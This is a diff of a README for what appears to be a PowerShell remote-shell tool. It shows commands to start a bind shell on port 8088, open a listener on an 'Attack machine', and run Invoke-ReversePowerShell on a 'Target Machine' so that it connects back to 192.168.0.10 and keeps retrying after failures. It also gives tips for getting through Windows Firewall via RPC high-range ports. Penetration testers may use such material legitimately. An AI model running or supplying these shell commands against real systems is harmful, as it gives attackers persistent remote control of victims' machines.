@@ -64,13 +64,13 @@ powershell.exe
 The below command can be executed to start a bind shell that connects the defined port to PowerShell.
 This command binds PowerShell to port 8088. I do not have a function that can connect to this. Netcat,
 ncat, metasploit, and other tools can be used to connect to this bind shell. I will add a tool in the
-future.
+future. You are able to use Ctrl + C to cancel the bind listener.
 ```powershell
 Start-Bind -Port 8088
 ```
 
 #### START LISTENER
-The below command can be executed to start a listener on the Attack machine on port 8089. This can be
+The below command was executed to start a listener on the Attack machine on port 8089. This can be
 connected too using Invoke-ReversePowerShell as well as ncat, netcat, metasploit, and other tools.
 The listener can be stopped or canceld by doing Ctrl + C.
 ```powershell
@@ -78,7 +78,7 @@ Start-Listener -Port 8089
 ```
 
 #### ISSUE REVERSE SHELL CONNECTION
-The below command is to be issued on the Target Machine to connect to the listener over
+The below command is to be issued on the Target Machine. The below command connected to the listener over
 port 8089. This will not be able to complete a connection to the Start-Bind cmdlet.
 If a connection failes a loop will be started that begins a 30 second visual countdown timer.
 After 30 seconds the connection will attempt to re-establish the shell.
@@ -86,6 +86,7 @@ After 30 seconds the connection will attempt to re-establish the shell.
 Invoke-ReversePowerShell -IpAddress 192.168.0.10 -Port 8089
 ```
 ---
+# MISC INFO
 #### FIREWALL AND BLOCKED PORTS
 If you are not able to gain a connection it is most likely due to the Windows Firewall. If you have access on a machine as a user you will not be able to make firewall changes. You need admin priviledges for that. Use the high range ports RPC would connect to or other common port. If a range has been defined you can find the allowed ports at "HKLM:\Software\Microsoft\Rpc\Internet\ with Entry name Data Type". Otherwise when not defined any ports between 49152-65535 might work.
 This command may also display the port allowed RPC port range
